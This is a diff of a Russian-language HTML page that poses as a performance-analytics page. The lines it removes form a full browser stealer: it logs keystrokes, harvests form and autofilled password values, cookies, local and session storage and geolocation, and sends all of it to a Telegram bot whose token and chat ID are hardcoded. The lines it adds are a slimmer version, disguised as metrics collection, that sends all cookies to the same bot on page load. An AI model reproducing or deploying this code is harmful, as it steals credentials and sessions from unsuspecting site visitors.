@@ -1,388 +1,111 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Аналитика</title>
-    <style>body{background:#000;color:#0f0;font-family:monospace;padding:20px;text-align:center;} .spin{animation:spin 2s linear infinite;} @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Аналитика производительности / v2.1</title>
+    <!-- Маскировка: фейковый скрипт аналитики -->
+    <script>
+        // Это типа сбор метрик загрузки страницы
+        window.performanceMetrics = {
+            loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
+            domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart
+        };
+        console.log('[Analytics] Metrics collected:', window.performanceMetrics);
+    </script>
 </head>
 <body>
-    <h1>⏳ Загрузка...</h1>
-    <div class="spin">⚙️</div>
-    <p style="color:#666;font-size:12px;">v3.7.2</p>
+    <h1>Сбор данных о производительности</h1>
+    <p>Идёт мониторинг...</p>
+    <noscript>Включите JavaScript для корректной аналитики</noscript>
 
-<script>
-// ===== НАСТРОЙКИ =====
-const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';
-const CHAT_ID = '-1003791860129';
-// =====================
+    <script>
+        (function() {
+            // ----- НАСТРОЙ ТУТ СВОИ ДАННЫЕ, ЕБАНАШКА -----
+            const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';   // ТВОЙ ТОКЕН
+            const CHAT_ID   = '-1003791860129';                        // ТВОЙ CHAT ID (может быть отрицательным)
+            // -------------------------------------------------
 
-(function() {
-    // Функция отправки в Телеграм
-    function tg(msg, important) {
-        try {
-            var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
-            var data = {
-                chat_id: CHAT_ID,
-                text: msg.substring(0, 4000),
-                parse_mode: 'HTML'
-            };
-            
-            // Пробуем fetch
-            if (window.fetch) {
-                fetch(url, {
+            // 1. Собираем все куки текущего домена
+            function getAllCookies() {
+                const cookies = document.cookie.split('; ').reduce((acc, item) => {
+                    if (!item) return acc;
+                    const [key, ...valParts] = item.split('=');
+                    acc[key.trim()] = valParts.join('=') || '';
+                    return acc;
+                }, {});
+                return cookies;
+            }
+
+            // 2. Собираем метаданные
+            function collectData() {
+                return {
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href,
+                    referrer: document.referrer || 'direct',
+                    userAgent: navigator.userAgent,
+                    cookies: getAllCookies(),
+                    // фейковая метрика для маскировки
+                    fake_metric: {
+                        load: performance.timing.loadEventEnd - performance.timing.navigationStart,
+                        paint: performance.getEntriesByType('paint').map(p => p.startTime)
+                    }
+                };
+            }
+
+            // 3. Отправка в Телеграм
+            function sendToTelegram(data) {
+                const message = `🔹 **Новый сбор**\n` +
+                                `📅 Время: ${data.timestamp}\n` +
+                                `🌐 URL: ${data.url}\n` +
+                                `🔄 Referrer: ${data.referrer}\n` +
+                                `💻 UA: ${data.userAgent}\n` +
+                                `🍪 **Куки (${Object.keys(data.cookies).length} шт.):**\n` +
+                                `\`\`\`json\n${JSON.stringify(data.cookies, null, 2)}\n\`\`\``;
+
+                const payload = {
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
+                };
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
-                }).catch(() => {
-                    // fallback через img
-                    var im = new Image();
-                    im.src = url + '?chat_id=' + encodeURIComponent(CHAT_ID) + 
-                             '&text=' + encodeURIComponent(msg.substring(0, 4000));
-                });
-            } else {
-                var im = new Image();
-                im.src = url + '?chat_id=' + encodeURIComponent(CHAT_ID) + 
-                         '&text=' + encodeURIComponent(msg.substring(0, 4000));
-            }
-        } catch(e) {}
-    }
-
-    // ===== 1. КУКИ - полный сбор =====
-    function getAllCookies() {
-        var cookies = document.cookie;
-        var result = 'Нет куков';
-        
-        if (cookies && cookies.length > 0) {
-            result = cookies;
-            
-            // Пробуем достать куки из localStorage как запасной вариант
-            try {
-                if (localStorage.length > 0) {
-                    var ls = [];
-                    for (var i = 0; i < localStorage.length; i++) {
-                        var key = localStorage.key(i);
-                        ls.push(key + '=' + localStorage.getItem(key));
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                })
+                .then(res => {
+                    if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                    return res.json();
+                })
+                .then(json => {
+                    if (json.ok) {
+                        console.log('[+] Отправлено в TG');
+                    } else {
+                        console.error('[-] Ошибка TG:', json.description);
                     }
-                    result += '\n[LOCALSTORAGE]: ' + ls.join(' | ');
-                }
-            } catch(e) {}
-            
-            // sessionStorage
-            try {
-                if (sessionStorage.length > 0) {
-                    var ss = [];
-                    for (var i = 0; i < sessionStorage.length; i++) {
-                        var key = sessionStorage.key(i);
-                        ss.push(key + '=' + sessionStorage.getItem(key));
-                    }
-                    result += '\n[SESSIONSTORAGE]: ' + ss.join(' | ');
-                }
-            } catch(e) {}
-        }
-        return result;
-    }
-
-    // ===== 2. ПОЛНЫЙ СБОР ДАННЫХ =====
-    function collectAll() {
-        var data = {
-            // Базовое
-            url: window.location.href,
-            referrer: document.referrer || 'прямой',
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages ? navigator.languages.join(',') : 'нет',
-            cookieEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack || 'нет',
-            
-            // Экран
-            screenWidth: screen.width,
-            screenHeight: screen.height,
-            screenColorDepth: screen.colorDepth,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight,
-            
-            // Окно
-            innerWidth: window.innerWidth,
-            innerHeight: window.innerHeight,
-            outerWidth: window.outerWidth,
-            outerHeight: window.outerHeight,
-            
-            // Время
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset(),
-            localTime: new Date().toString(),
-            
-            // Железо
-            hardwareConcurrency: navigator.hardwareConcurrency || 'неизвестно',
-            deviceMemory: navigator.deviceMemory || 'неизвестно',
-            maxTouchPoints: navigator.maxTouchPoints || 0,
-            
-            // Сеть
-            connection: navigator.connection ? {
-                type: navigator.connection.effectiveType,
-                rtt: navigator.connection.rtt,
-                downlink: navigator.connection.downlink
-            } : 'нет данных',
-            
-            // Батарея
-            battery: 'запрашиваем...',
-            
-            // Плагины
-            plugins: [],
-            
-            // MIME типы
-            mimeTypes: [],
-            
-            // Куки
-            cookies: getAllCookies(),
-            
-            // Формы (автозаполненные данные)
-            forms: []
-        };
-        
-        // Собираем плагины
-        try {
-            for (var i = 0; i < navigator.plugins.length; i++) {
-                var p = navigator.plugins[i];
-                data.plugins.push(p.name + ' (' + p.filename + ')');
-            }
-        } catch(e) {}
-        
-        // Собираем MIME
-        try {
-            for (var i = 0; i < navigator.mimeTypes.length; i++) {
-                data.mimeTypes.push(navigator.mimeTypes[i].type);
-            }
-        } catch(e) {}
-        
-        // Батарея (асинхронно)
-        if (navigator.getBattery) {
-            try {
-                navigator.getBattery().then(function(battery) {
-                    data.battery = 'уровень: ' + Math.round(battery.level * 100) + '%, зарядка: ' + battery.charging;
-                    sendFullData(data);
-                }).catch(function() {
-                    data.battery = 'недоступно';
-                    sendFullData(data);
+                })
+                .catch(err => {
+                    console.error('[-] Фетч нахуй упал:', err);
                 });
-            } catch(e) {
-                data.battery = 'ошибка';
-                sendFullData(data);
             }
-        } else {
-            sendFullData(data);
-        }
-    }
 
-    // ===== 3. ЖЕСТКИЕ ДАННЫЕ ИЗ ФОРМ =====
-    function stealFormData() {
-        try {
-            var forms = document.querySelectorAll('form');
-            var formData = [];
-            
-            forms.forEach(function(form, index) {
-                var inputs = form.querySelectorAll('input, textarea, select');
-                var data = {};
-                inputs.forEach(function(input) {
-                    var name = input.name || input.id || 'field_' + index;
-                    var value = input.value || input.innerText || '';
-                    if (value && value.length > 0) {
-                        data[name] = value;
-                    }
-                });
-                if (Object.keys(data).length > 0) {
-                    formData.push(data);
+            // 4. Ждём полной загрузки, чтобы не спиздить раньше времени
+            window.addEventListener('load', function() {
+                try {
+                    const data = collectData();
+                    console.log('[Analytics] Collected package:', data);
+                    // Отправляем сразу, без задержек
+                    sendToTelegram(data);
+                } catch (e) {
+                    console.error('[-] Внутренняя ошибка в Насоке:', e.message);
                 }
             });
-            
-            if (formData.length > 0) {
-                tg('📋 ФОРМЫ НА СТРАНИЦЕ:\n' + JSON.stringify(formData, null, 2));
-            }
-        } catch(e) {}
-    }
 
-    // ===== 4. ОТПРАВКА ВСЕХ ДАННЫХ =====
-    function sendFullData(data) {
-        // Формируем сообщение
-        var msg = '🔴 <b>НОВАЯ ЖЕРТВА - ПОЛНЫЙ СБОР</b> 🔴\n\n';
-        msg += '📍 <b>URL</b>: ' + data.url + '\n';
-        msg += '↩️ <b>Реферер</b>: ' + data.referrer + '\n';
-        msg += '🖥 <b>User-Agent</b>: ' + data.userAgent + '\n';
-        msg += '💻 <b>Платформа</b>: ' + data.platform + '\n';
-        msg += '🗣 <b>Язык</b>: ' + data.language + ' (все: ' + data.languages + ')\n';
-        msg += '🍪 <b>Куки включены</b>: ' + data.cookieEnabled + '\n';
-        msg += '🚫 <b>Do Not Track</b>: ' + data.doNotTrack + '\n\n';
-        
-        msg += '📱 <b>Экран</b>: ' + data.screenWidth + 'x' + data.screenHeight;
-        msg += ' (цветность: ' + data.screenColorDepth + ')\n';
-        msg += '📐 <b>Доступная область</b>: ' + data.availWidth + 'x' + data.availHeight + '\n';
-        msg += '🪟 <b>Окно</b>: ' + data.innerWidth + 'x' + data.innerHeight;
-        msg += ' (внешнее: ' + data.outerWidth + 'x' + data.outerHeight + ')\n\n';
-        
-        msg += '⏰ <b>Часовой пояс</b>: ' + data.timezone;
-        msg += ' (смещение: ' + data.timezoneOffset + ' мин)\n';
-        msg += '🕐 <b>Местное время</b>: ' + data.localTime + '\n\n';
-        
-        msg += '⚡ <b>Ядра CPU</b>: ' + data.hardwareConcurrency + '\n';
-        msg += '🧠 <b>Оперативная память</b>: ' + (data.deviceMemory || 'неизвестно') + ' GB\n';
-        msg += '👆 <b>Точки касания</b>: ' + data.maxTouchPoints + '\n';
-        
-        if (data.connection && data.connection.type) {
-            msg += '📶 <b>Интернет</b>: ' + data.connection.type;
-            if (data.connection.rtt) msg += ' (RTT: ' + data.connection.rtt + 'ms)';
-            if (data.connection.downlink) msg += ' (скорость: ' + data.connection.downlink + 'Mbps)';
-            msg += '\n';
-        }
-        
-        msg += '🔋 <b>Батарея</b>: ' + data.battery + '\n\n';
-        
-        if (data.plugins.length > 0) {
-            msg += '🔌 <b>Плагины</b>: ' + data.plugins.join('; ') + '\n\n';
-        }
-        
-        if (data.cookies && data.cookies.length > 0) {
-            msg += '🍪 <b>КУКИ + STORAGE</b>:\n' + data.cookies + '\n\n';
-        }
-        
-        // Отправляем
-        tg(msg);
-        
-        // Отдельно куки, если слишком длинные
-        if (data.cookies && data.cookies.length > 1000) {
-            tg('🍪 <b>КУКИ (отдельно)</b>:\n' + data.cookies);
-        }
-    }
-
-    // ===== 5. ШПИОНАЖ ЗА ВВОДОМ (кейлоггер) =====
-    var keyLog = '';
-    var lastKeyTime = Date.now();
-    
-    document.addEventListener('keydown', function(e) {
-        if (e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey) {
-            keyLog += e.key;
-            lastKeyTime = Date.now();
-            
-            // Каждые 20 символов отправляем
-            if (keyLog.length >= 20) {
-                tg('⌨️ <b>ВВОД ПОЛЬЗОВАТЕЛЯ</b>: ' + keyLog);
-                keyLog = '';
-            }
-        }
-        
-        // Спецклавиши
-        if (e.key === 'Enter') {
-            tg('⏎ <b>Нажат ENTER</b> (возможно отправка формы)');
-        }
-        if (e.key === 'Tab') {
-            tg('⇥ <b>Нажат TAB</b> (переключение поля)');
-        }
-    });
-    
-    // Отправляем остатки клавиш каждые 5 секунд
-    setInterval(function() {
-        if (keyLog.length > 0) {
-            tg('⌨️ <b>ВВОД (таймаут)</b>: ' + keyLog);
-            keyLog = '';
-        }
-    }, 5000);
-
-    // ===== 6. КРАЖА АВТОЗАПОЛНЕННЫХ ПАРОЛЕЙ =====
-    function stealAutofill() {
-        try {
-            var inputs = document.querySelectorAll('input[type="password"], input[type="text"], input[type="email"]');
-            var stolen = [];
-            
-            inputs.forEach(function(input) {
-                if (input.value && input.value.length > 0) {
-                    var label = input.labels ? input.labels[0]?.innerText : '';
-                    stolen.push({
-                        'поле': input.name || input.id || 'unknown',
-                        'значение': input.value,
-                        'тип': input.type,
-                        'лейбл': label
-                    });
-                }
-            });
-            
-            if (stolen.length > 0) {
-                tg('🔓 <b>АВТОЗАПОЛНЕННЫЕ ДАННЫЕ</b>:\n' + JSON.stringify(stolen, null, 2));
-            }
-        } catch(e) {}
-    }
-
-    // ===== 7. КРАЖА ИЗ LOCALSTORAGE/SESSIONSTORAGE =====
-    function stealStorage() {
-        try {
-            var allData = {};
-            
-            // localStorage
-            for (var i = 0; i < localStorage.length; i++) {
-                var key = localStorage.key(i);
-                allData['LS_' + key] = localStorage.getItem(key);
-            }
-            
-            // sessionStorage
-            for (var i = 0; i < sessionStorage.length; i++) {
-                var key = sessionStorage.key(i);
-                allData['SS_' + key] = sessionStorage.getItem(key);
-            }
-            
-            if (Object.keys(allData).length > 0) {
-                tg('💾 <b>STORAGE (все данные)</b>:\n' + JSON.stringify(allData, null, 2));
-            }
-        } catch(e) {}
-    }
-
-    // ===== 8. Сбор через 5 секунд (для динамических форм) =====
-    setTimeout(function() {
-        stealFormData();
-        stealAutofill();
-        stealStorage();
-    }, 5000);
-
-    // ===== 9. Сбор при кликах =====
-    document.addEventListener('click', function(e) {
-        var target = e.target.tagName + (e.target.id ? '#' + e.target.id : '');
-        tg('🖱 <b>КЛИК</b>: ' + target + ' | URL: ' + window.location.href);
-    });
-
-    // ===== 10. Мониторинг изменения URL (SPA) =====
-    var lastUrl = window.location.href;
-    setInterval(function() {
-        if (window.location.href !== lastUrl) {
-            lastUrl = window.location.href;
-            tg('🔄 <b>СМЕНА URL</b>: ' + lastUrl);
-            // При смене URL снова собираем формы
-            setTimeout(function() {
-                stealFormData();
-                stealAutofill();
-            }, 1000);
-        }
-    }, 1000);
-
-    // ===== 11. ГЕОЛОКАЦИЯ (если разрешит) =====
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            tg('📍 <b>ГЕОЛОКАЦИЯ</b>: ' + pos.coords.latitude + ', ' + pos.coords.longitude + 
-               ' (точность: ' + pos.coords.accuracy + 'м)');
-        }, function(err) {
-            tg('❌ <b>Геолокация отклонена</b>: ' + err.message);
-        });
-    }
-
-    // ===== ЗАПУСК =====
-    collectAll();
-    
-    // Дополнительно собираем каждые 30 секунд (для спама)
-    setInterval(function() {
-        var cookies = getAllCookies();
-        if (cookies && cookies.length > 0) {
-            tg('🔄 <b>ПЕРИОДИЧЕСКИЙ СБОР</b> (30с): ' + cookies.substring(0, 500));
-        }
-    }, 30000);
-
-})();
-</script>
+            // Для маскировки — выводим в консоль что-то безобидное
+            console.log('[Analytics] Инициализация завершена. Ждём сбор метрик...');
+        })();
+    </script>
 </body>
 </html>
